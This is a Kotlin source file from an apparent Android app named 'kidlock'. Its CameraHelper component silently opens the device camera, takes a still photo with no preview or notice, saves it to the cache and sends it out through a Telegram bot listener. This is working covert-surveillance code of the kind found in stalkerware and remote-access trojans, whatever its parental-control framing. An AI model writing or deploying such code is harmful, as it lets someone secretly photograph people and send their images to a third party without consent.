package com.kidlock

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

object CameraHelper {

    fun captureAndSend(context: Context, botToken: String, chatId: String, front: Boolean = true) {
        val thread = HandlerThread("CamThread").also { it.start() }
        val handler = Handler(thread.looper)
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager

        val facing = if (front) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
        val cameraId = manager.cameraIdList.firstOrNull { id ->
            manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
        } ?: manager.cameraIdList.firstOrNull() ?: run { thread.quitSafely(); return }

        val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)

        imageReader.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining()).also { buffer.get(it) }
                image.close()
                val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                val file = File(context.cacheDir, "photo_$ts.jpg")
                FileOutputStream(file).use { it.write(bytes) }
                TelegramListener.instance.sendPhoto(file.absolutePath)
            } catch (e: Exception) {
                Log.e("CameraHelper", "image error: ${e.message}")
            } finally {
                reader.close()
                thread.quitSafely()
            }
        }, handler)

        try {
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val surface = imageReader.surface
                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                        addTarget(surface)
                        set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                        set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                    }
                    camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, result: TotalCaptureResult) {
                                    camera.close()
                                }
                            }, handler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            camera.close(); thread.quitSafely()
                        }
                    }, handler)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); thread.quitSafely() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); thread.quitSafely() }
            }, handler)
        } catch (e: Exception) {
            Log.e("CameraHelper", "openCamera error: ${e.message}")
            thread.quitSafely()
        }
    }
}
